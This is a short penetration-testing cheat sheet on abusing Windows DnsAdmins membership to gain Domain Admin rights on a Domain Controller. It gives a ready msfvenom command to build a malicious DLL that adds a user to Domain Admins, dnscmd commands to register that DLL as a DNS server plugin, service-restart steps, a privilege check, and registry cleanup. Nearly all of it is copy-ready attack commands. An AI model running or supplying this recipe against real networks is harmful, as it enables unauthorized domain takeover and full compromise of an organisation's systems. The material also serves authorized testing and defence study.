# DnsAdmins

## <mark style="color:yellow;">ABOUT</mark>

Members of the <mark style="color:red;">**DnsAdmins**</mark> group can <mark style="color:purple;">**access DNS information within the network**</mark>. The Windows DNS service allows <mark style="color:yellow;">**custom plugins**</mark>, which can execute functions to resolve name queries beyond the locally hosted DNS zones. Since the DNS service operates with <mark style="color:green;">`NT AUTHORITY\SYSTEM`</mark> privileges, being part of this group could be exploited to escalate privileges on a Domain Controller or a dedicated DNS server for the domain. The built-in **dnscmd** utility can be used to define the path of the plugin DLL.

## <mark style="color:yellow;">Importing custom plugin</mark>

#### Generating malicious dll

```bash
msfvenom -p windows/x64/exec cmd='net group "domain admins" ven17 /add /domain' -f dll -o adduser.dll
```

#### Starting local HTTP server

```bash
python3 -m http.server 1337
```

#### **Loading DLL**

<mark style="color:orange;">**You should be DnsAdmins group member!**</mark>

```powershell
C:\> dnscmd.exe /config /serverlevelplugindll C:\Users\ven17\Desktop\adduser.dll
```

* If successful: <mark style="color:green;">`Registry property serverlevelplugindll successfully reset.`</mark>

#### Restart DNS Service

<pre class="language-sh"><code class="lang-sh"><strong>C:\> sc.exe stop dns
</strong>C:\> sc.exe start dns
</code></pre>

#### Confirm Admin Privileges

```sh
PS C:\> net group "Domain Admins" /dom
```

## <mark style="color:yellow;">Cleanup</mark>

#### **Confirming Registry Key Added**

```powershell
C:\> reg query \\13.13.13.13\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
```

#### Delete Registry Key

```powershell
C:\> reg delete \\13.13.13.13\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
```

#### Restart DNS Service

```powershell
C:\> sc.exe start dns
C:\> sc query dns
```
